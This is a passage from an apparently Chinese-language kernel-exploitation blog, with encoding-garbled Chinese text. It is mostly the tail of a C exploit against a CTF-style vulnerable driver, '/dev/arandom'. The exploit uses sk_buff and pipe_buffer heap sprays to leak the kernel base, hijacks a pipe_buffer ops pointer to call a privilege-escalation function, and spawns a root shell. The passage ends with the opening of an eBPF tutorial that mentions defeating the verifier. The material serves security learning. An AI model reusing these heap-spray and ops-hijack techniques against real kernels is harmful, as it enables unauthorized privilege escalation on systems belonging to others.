class="number">0x100</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_buf_size = page_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *pipe_buf = <span class="built_in">malloc</span>(pipe_buf_size);</span><br><span class="line">  <span class="type">int</span> pipe_fd[pipe_num][<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fd[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, i, pipe_buf_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1</span>; ++j) &#123;</span><br><span class="line">      check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, pipe_buf_size));</span><br><span class="line">    &#125;</span><br><span class="line">    check(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>));</span><br><span class="line">    check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_seq</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> seq_file_num = <span class="number">0xc00</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> seq_fd[seq_file_num];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; seq_file_num; ++i) &#123;</span><br><span class="line">    seq_fd[i] = check(open(<span class="string">&quot;/proc/self/stat&quot;</span>, <span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray seq_op successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1003</span>)); <span class="comment">// write</span></span><br><span class="line">  info(<span class="string">&quot;write buffer+%#x &lt;- %#x\n&quot;</span>, AAA.rand_offset, AAA.rand_value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> Linux v6.11 add msg_msg-xx kmalloc cache and only affects the first</span></span><br><span class="line"><span class="comment">// page, which means we can&#x27;t use it to perform heap spray :(</span></span><br><span class="line"><span class="comment">// Pwned :)</span></span><br><span class="line"><span class="comment">// Success rate: approximately 1/40</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// ioctl: 0x1001: alloc 0x1002: free</span></span><br><span class="line">  <span class="comment">// 0x1003:</span></span><br><span class="line">  <span class="comment">// *(_DWORD *)((char *)buffer + rand_offset) = AAA.rand_value;</span></span><br><span class="line">  <span class="comment">// 0x1004:</span></span><br><span class="line">  <span class="comment">// copy_to_user AAA</span></span><br><span class="line">  <span class="comment">// 0x1005:</span></span><br><span class="line">  <span class="comment">// if ( *(_QWORD *)((char *)buffer + v4) == AAA.rand_value</span></span><br><span class="line">  <span class="comment">//&amp;&amp; v4 == *(_QWORD *)((char *)buffer + v4 + 16)</span></span><br><span class="line">  <span class="comment">//&amp;&amp; *(_QWORD *)((char *)buffer + v4 + 24) == AAA.rand_size )</span></span><br><span class="line">  <span class="comment">//&#123;</span></span><br><span class="line">  <span class="comment">//*(_QWORD *)((char *)buffer + v4 + 32) = &amp;get_random_bytes;</span></span><br><span class="line">  <span class="comment">//&#125;</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  save_stat();</span><br><span class="line">  adjust_rlimit();</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;page size: %#lx\n&quot;</span>, page_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x01: open device</span></span><br><span class="line">  step(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd = check(open(<span class="string">&quot;/dev/arandom&quot;</span>, <span class="number">2</span>));</span><br><span class="line">  success(<span class="string">&quot;device open successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  ioctl(fd, <span class="number">0x1004</span>, &amp;AAA);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_size: %#x\n&quot;</span>, AAA.rand_size);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_offset: %#x\n&quot;</span>, AAA.rand_offset);</span><br><span class="line">  info(<span class="string">&quot;arandom rand_value: %#x\n&quot;</span>, AAA.rand_value);</span><br><span class="line"></span><br><span class="line">  ioctl(fd, <span class="number">0x1001</span>); <span class="comment">// alloc</span></span><br><span class="line">  info(<span class="string">&quot;alloc buffer size: %#x\n&quot;</span>, AAA.rand_size);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1002</span>)); <span class="comment">// free</span></span><br><span class="line">  info(<span class="string">&quot;free buffer successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> offset = AAA.rand_offset &amp; <span class="number">0xfff</span>;</span><br><span class="line">  info(<span class="string">&quot;page offset: %#x\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x02: spray sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;spray sk_buff&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 10</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_reserve_size = <span class="number">320</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_size = page_size - skb_reserve_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> *skb_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    check(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]));</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf, (<span class="type">char</span>)i, skb_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf, <span class="string">&quot;hamoood&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf + offset, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x10</span>, &amp;AAA.rand_offset, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x18</span>, &amp;AAA.rand_size, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(write(sk_sockets[i][<span class="number">0</span>], skb_buf, skb_size));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray sk_buff successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x03: check &amp; read sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;check &amp; read sk_buff&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *skb_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1005</span>)); <span class="comment">// check</span></span><br><span class="line">  info(<span class="string">&quot;check buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;read sk_buff length %#x\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(read(sk_sockets[i][<span class="number">1</span>], skb_recv, skb_size));</span><br><span class="line"></span><br><span class="line">      <span class="type">uint64_t</span> possible_addr = *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ((possible_addr &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &#123;</span><br><span class="line">        success(<span class="string">&quot;find kernel addr at No.%d: %#lx\n&quot;</span>, i,</span><br><span class="line">                *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>));</span><br><span class="line">        kernel_base = possible_addr - calc(<span class="number">0xffffffff81907850</span>);</span><br><span class="line">        success(<span class="string">&quot;find kernel base: %#lx\n&quot;</span>, kernel_base);</span><br><span class="line">        <span class="keyword">goto</span> FIND;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (kernel_base == <span class="number">0</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;not found&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">FIND:</span><br><span class="line">  <span class="comment">// INFO: Step 0x04: spray pipe_buffer</span></span><br><span class="line">  step(<span class="string">&quot;spray pipe_buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *page;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">void</span> *ops;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">  &#125; pipe_example;</span><br><span class="line"></span><br><span class="line">  pipe_example.page = (<span class="type">void</span> *)<span class="number">0xffffea0000000000</span>;</span><br><span class="line">  pipe_example.len = <span class="number">0x1000</span>;</span><br><span class="line">  pipe_example.offset = <span class="number">0x0</span>;</span><br><span class="line">  pipe_example.ops = (<span class="type">void</span> *)calc(<span class="number">0xffffffff8222bb80</span>);</span><br><span class="line">  pipe_example.ops = <span class="literal">NULL</span>;</span><br><span class="line">  pipe_example.flags = <span class="number">0x10</span>;</span><br><span class="line">  pipe_example.private = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> pipe_buffer_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;pipe_buffer size: %#lx\n&quot;</span>, pipe_buffer_size);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_num = <span class="number">0x10</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_buf_size = page_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> inner_pipe_offset = offset % pipe_buffer_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *pipe_buf = <span class="built_in">malloc</span>(pipe_buf_size);</span><br><span class="line">  <span class="type">int</span> pipe_fd[pipe_num][<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fd[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, i, pipe_buf_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, pipe_buf_size));</span><br><span class="line">    check(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1</span>; ++j) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(pipe_buf + <span class="number">0x8</span>, j, <span class="number">0x8</span>);</span><br><span class="line">      check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray pipe_buffer successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x05: write random value</span></span><br><span class="line">  step(<span class="string">&quot;write random value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;inner pipe offset: %#x\n&quot;</span>, inner_pipe_offset);</span><br><span class="line">  info(<span class="string">&quot;before writting:\n&quot;</span>);</span><br><span class="line">  dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">char</span> *)(&amp;pipe_example) + inner_pipe_offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1003</span>)); <span class="comment">// write</span></span><br><span class="line">  info(<span class="string">&quot;write buffer+%#x &lt;- %#x\n&quot;</span>, AAA.rand_offset, AAA.rand_value);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;after writting:\n&quot;</span>);</span><br><span class="line">  dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *fake_ops = pipe_example.ops;</span><br><span class="line">  <span class="type">void</span> *fake_ops_page = (<span class="type">void</span> *)((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xFFFFFFFFFffff000</span>);</span><br><span class="line">  <span class="type">uint32_t</span> fake_ops_page_offset = ((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pipe_example.ops == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;Useless write&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;affect pipe_buffer&#x27;s ops successfully\n&quot;</span>);</span><br><span class="line">  success(<span class="string">&quot;pipe_buffer&#x27;s ops: %p\n&quot;</span>, pipe_example.ops);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;mmap page %p\n&quot;</span>, fake_ops_page);</span><br><span class="line">  <span class="type">void</span> *mmap_page = mmap(fake_ops_page, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                         MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mmap_page != fake_ops_page) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;mmap error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x06: close pipes</span></span><br><span class="line">  step(<span class="string">&quot;close pipes&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ffffffff812c8d40 T commit_creds</span></span><br><span class="line">  <span class="comment">// ffffffff812c8fd0 T prepare_kernel_cred</span></span><br><span class="line">  commit_creds = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8d40</span>);</span><br><span class="line">  prepare_kernel_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8fd0</span>);</span><br><span class="line">  init_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff82a54120</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> win_addr = (<span class="type">uint64_t</span>)win;</span><br><span class="line">  info(<span class="string">&quot;win address: %#lx\n&quot;</span>, win_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_ops + i * <span class="number">8</span>, &amp;win_addr, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(close(pipe_fd[i][<span class="number">0</span>]));</span><br><span class="line">    check(close(pipe_fd[i][<span class="number">1</span>]));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  shell();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    0xffffffff8170540b &lt;load_msg+59&gt;    call   0xffffffff81501210</span></span><br><span class="line"><span class="comment">    &lt;__kmalloc_node_noprof&gt;</span></span><br><span class="line"><span class="comment">    rdi: 0xa00</span></span><br><span class="line"><span class="comment">    rsi: 0xffff8880044512a0 &lt;- 0</span></span><br><span class="line"><span class="comment">    rdx: 0xcc0</span></span><br><span class="line"><span class="comment">    rcx: 0xffffffff</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/15/ebpf1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/15/ebpf1/" class="post-title-link" itemprop="url">[Linux Kernel Pwn] eBPF å…¥é—¨ç¬”è®°ï¼ˆä¸€ï¼‰</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-04-15 22:57:44" itemprop="dateCreated datePublished" datetime="2025-04-15T22:57:44+08:00">2025-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-26 01:36:25" itemprop="dateModified" datetime="2025-04-26T01:36:25+08:00">2025-04-26</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <!--toc:start-->

<ul>
<li><a href="#eBPF%E4%BB%8B%E7%BB%8D">eBPFä»‹ç»</a></li>
<li><a href="#eBPF%E5%9F%BA%E7%A1%80">eBPFåŸºç¡€</a><ul>
<li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">åŸºç¡€çŸ¥è¯†</a></li>
<li><a href="#%E8%B0%83%E7%94%A8%E6%A8%A1%E6%9D%BF">è°ƒç”¨æ¨¡æ¿</a></li>
<li><a href="#eBPF%E6%8C%87%E4%BB%A4">eBPFæŒ‡ä»¤</a></li>
<li><a href="#eBPF%E6%8C%87%E4%BB%A4%E7%BC%96%E5%86%99">eBPFæŒ‡ä»¤ç¼–å†™</a></li>
<li><a href="#Helper%E5%87%BD%E6%95%B0">Helperå‡½æ•°</a><!--toc:end--></li>
</ul>
</li>
</ul>
<h1 id="eBPFä»‹ç»"><a href="#eBPFä»‹ç»" class="headerlink" title="eBPFä»‹ç»"></a>eBPFä»‹ç»</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://ebpf.io/zh-hans/">eBPF</a> æ˜¯ä¸€é¡¹é©å‘½æ€§çš„æŠ€æœ¯ï¼Œèµ·æºäº Linux å†…æ ¸ï¼Œå®ƒå¯ä»¥åœ¨ç‰¹æƒä¸Šä¸‹æ–‡ä¸­ï¼ˆå¦‚æ“ä½œç³»ç»Ÿå†…æ ¸ï¼‰è¿è¡Œæ²™ç›’ç¨‹åºã€‚å®ƒç”¨äºå®‰å…¨æœ‰æ•ˆåœ°æ‰©å±•å†…æ ¸çš„åŠŸèƒ½ï¼Œè€Œæ— éœ€é€šè¿‡æ›´æ”¹å†…æ ¸æºä»£ç æˆ–åŠ è½½å†…æ ¸æ¨¡å—çš„æ–¹å¼æ¥å®ç°ã€‚</p>
</blockquote>
<p>å†å²ä¸Šç”±BPF(ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤å™¨ Berkeley Packet Filter)å‘å±•è€Œæ¥ï¼ˆç°åœ¨ç§°ä¸ºcBPFï¼‰ï¼Œç›´æ¥åœ¨å†…æ ¸ä¸­è¿è¡Œç‰¹æƒä»£ç ï¼Œç»™äºˆäº†Linuxå†…æ ¸ç¼–ç¨‹çš„æå¤§çš„çµæ´»æ€§ã€‚<br>eBPFéœ€è¦å†…æ ¸æ”¯æŒï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ä¸€ç³»åˆ—æŒ‡ä»¤ç¼–å†™ç¨‹åºï¼Œåœ¨ç¨‹åºè¢«åŠ è½½åéœ€è¦ç»è¿‡æ£€éªŒï¼ŒéªŒè¯é€šè¿‡åä¼šé€šè¿‡JIT (Just-in-Time) ç¼–è¯‘æˆæœºå™¨ç æ‰§è¡Œã€‚</p>
<p>ä¸ºäº†æ›´åŠ ä¾¿æ·ï¼ŒeBPFè¿˜æ”¯æŒåœ¨eBPFæŒ‡ä»¤ä¸­ç›´æ¥è°ƒç”¨å‡½æ•°(è¢«ç§°ä¸ºHelperå‡½æ•°)ã€‚eBPFè¿˜æä¾›mapç­‰æ•°æ®ç»“æ„ç”¨æ¥ä¸ç”¨æˆ·æ€ä¹‹é—´ä¼ é€’ä¿¡æ¯ï¼›<br>åœ¨ç›¸å…³æ¼æ´åˆ©ç”¨ä¸­ï¼Œä¸€èˆ¬æ˜¯æƒ³æ–¹æ³•ç»•è¿‡ä¸¥æ ¼çš„eBPFæ£€éªŒï¼Œé€šè¿‡æ¼æ´æ··æ·†æ£€éªŒçš„è¿‡ç¨‹ï¼Œä½¿å¾—æ£€éªŒï¼ˆæ¨¡æ‹Ÿæ‰§è¡Œï¼‰ç»“æœå’Œå®é™…JITç¼–è¯‘è¿è¡Œç»“æœä¸ä¸€è‡´ï¼Œä»è€Œé€ æˆå®‰å…¨æ¼æ´ï¼Œè¿›ä¸€æ­¥è½¬åŒ–ä¸ºæ–¹ä¾¿åˆ©ç”¨çš„ç±»å‹ã€‚</p>
<blockquote>
<p>æˆ‘ä»¬è§åˆ°çš„æ²™ç®±é¢˜ä¸€èˆ¬æ˜¯ç”¨seccompæ¥å®ç°çš„ï¼Œè€Œseccomp-bpfä¾¿æ˜¯é‡‡ç”¨äº†BPFæŠ€æœ¯å®ç°è¿‡æ»¤ç³»ç»Ÿè°ƒç”¨</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.ebpf.io/">ç›¸å…³æ–‡æ¡£1</a> <a target="_blank" rel="noopener" href="https://docs.linuxkernel.org.cn/userspace-api/ebpf/syscall.html">ç›¸å…³æ–‡æ¡£2</a> Linuxç³»ç»Ÿ<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L77">å¦è§<code>/usr/include/linux/bpf.h</code></a></p>
<blockquote>
<p>bpfè®¾è®¡ç›¸å…³ï¼Œ<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/bpf_design_QA.rst">å¦è§æ­¤</a></p>
</blockquote>
</blockquote>
<h1 id="eBPFåŸºç¡€"><a href="#eBPFåŸºç¡€" class="headerlink" title="eBPFåŸºç¡€"></a>eBPFåŸºç¡€</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><blockquote>
<p>æœ¬ç« çš„è®¨è®ºç¯å¢ƒåŸºäºLinux v6.13.7</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in  /usr/include/asm/unistd_64.h</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 321</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ç³»ç»Ÿè°ƒç”¨å·ä¸º321çš„ç³»ç»Ÿè°ƒç”¨bpfå¯ä»¥ä½¿ç”¨eBPFç›¸å…³åŠŸèƒ½ã€‚glibcå¹¶æ²¡æœ‰æä¾›äº†åŒ…è£…å‡½æ•°ï¼Œéœ€è¦æˆ‘ä»¬è¿›è¡Œraw syscall:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="type">unsigned</span> <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    syscall(__NR_bpf, cmd, attr, size);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>å‚æ•°<code>int cmd</code>æ ‡è¯†bpfçš„è¡Œä¸ºï¼ˆç±»å‹åº”ä¸ºenum bpf_cmdï¼‰ã€‚å¸¸ç”¨çš„æœ‰ï¼š<ul>
<li><code>BPF_PROG_LOAD</code> ç”¨äºåŠ è½½å¹¶éªŒè¯eBPFç¨‹åºï¼Œå†™å¥½äº†eBPFç¨‹åºå°±ç”¨æ­¤å‚æ•°ä¸Šä¼ ã€‚è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆfdï¼‰ä»¥ä¾›ä½¿ç”¨ã€‚</li>
<li><code>BPF_MAP_CREATE</code> ç”¨äºåˆ›å»ºä¸€ä¸ªeBPF mapï¼Œä»¥é”®å€¼å¯¹ï¼ˆkey-valueï¼‰çš„å½¢å¼å­˜å‚¨æ•°æ®ã€‚è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆfdï¼‰ä»¥ä¾›ä½¿ç”¨ã€‚</li>
<li><code>BPF_MAP_LOOKUP_ELEM</code>ä¸<code>BPF_MAP_UPDATE_ELEM</code>ã€<code>BPF_MAP_DELETE_ELEM</code>åˆ†åˆ«ç”¨æ¥å¯»æ‰¾ã€æ›´æ–°å’Œåˆ é™¤mapä¸­çš„å€¼ï¼ˆvalueï¼‰&#x2F;é”®å€¼å¯¹ï¼ˆkey&#x2F;value pairï¼‰</li>
<li><code>BPF_MAP_GET_NEXT_KEY</code>å¯»æ‰¾mapä¸­çš„ä¸‹ä¸€ä¸ªé”®ï¼ˆkeyï¼‰</li>
<li><code>BPF_MAP_FREEZE</code> å†»ç»“mapçš„å†™æƒé™ï¼ˆåŒ…æ‹¬é€šè¿‡bpfè°ƒç”¨å®ç°çš„ï¼‰ï¼Œæ­¤æ—¶æ£€éªŒï¼ˆverifierï¼‰è¿‡ç¨‹ä¼šå°†mapä¸­çš„å€¼å½“ä½œå¸¸æ•°</li>
<li><code>BPF_PROG_TEST_RUN</code> ç”¨äºæµ‹è¯•è¿è¡ŒeBPFï¼Œæµ‹è¯•ç”¨è¾“å…¥ï¼ˆdata&#x2F;contextï¼‰åŠè¾“å‡ºåœ¨å‚æ•°<code>union bpf_attr *attr</code>ä¸­ç»™å‡º</li>
<li>å®Œæ•´ç‰ˆ<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L922">è§æ­¤</a></li>
</ul>
</li>
<li>å‚æ•°<code>unsigned int size</code>ä¸€èˆ¬è®¾ç½®ä¸º<code>sizeof(attr)</code></li>
